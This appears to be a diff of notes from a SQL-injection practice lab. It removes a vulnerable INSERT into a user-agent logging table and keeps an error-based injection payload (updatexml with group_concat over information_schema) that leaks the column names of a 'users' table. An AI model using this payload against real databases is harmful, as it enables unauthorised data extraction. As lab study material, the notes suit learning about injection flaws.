@@ -1,10 +1,7 @@
 
 
-INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)
 
 
 
 ' and updatexml(0x3a,concat(0x3a,(select group_concat(COLUMN_NAME) FROM information_schema.COLUMNS  WHERE TABLE_NAME = 'users'),0x3a),0x3a),1,1); #
 
-
-INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('' and updatexml(0x3a,concat(0x3a,(select group_concat(COLUMN_NAME) FROM information_schema.COLUMNS  WHERE TABLE_NAME = 'users'),0x3a),0x3a),1,1); #', '$IP', $uname)
